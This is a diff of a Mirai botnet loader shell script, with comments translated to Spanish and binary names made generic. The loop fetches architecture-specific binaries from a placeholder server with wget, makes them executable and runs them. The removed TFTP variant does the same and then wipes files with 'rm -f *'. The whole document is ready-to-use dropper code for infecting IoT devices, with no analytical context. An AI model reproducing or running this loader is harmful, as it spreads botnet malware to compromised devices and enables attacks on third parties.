@@ -1,34 +1,14 @@
+// http bin.sh
 #!/bin/sh
 
-# Edit
+# Editemos
 WEBSERVER="IP:PUERTO"
-# Stop editing now
+# No editemos más
 
-
-BINARIES="mirai.mips mirai.x86 mirai.arm7 mirai.sh4  mirai.mpsl mirai.arm"
+BINARIES="bin.mips bin.x86 bin.arm7 bin.sh4  bin.mpsl bin.arm etc.etc etc.etc"
 
 for Binary in $BINARIES; do
     wget http://$WEBSERVER/$Binary -O dvrHelper
-    chmod 777 dvrHelper
-    ./dvrHelper
-done
-
-rm -f *
-
-
-
-// tftp tbin.sh
-#!/bin/sh
-
-# Edit
-TFTPSERVER="IP"
-# Stop editing now
-
-
-BINARIES="mirai.mips mirai.x86 mirai.arm7 mirai.sh4  mirai.mpsl mirai.arm"
-
-for Binary in $BINARIES; do
-    tftp -g -l dvrHelper -r $Binary $TFTPSERVER
     chmod 777 dvrHelper
     ./dvrHelper
 done
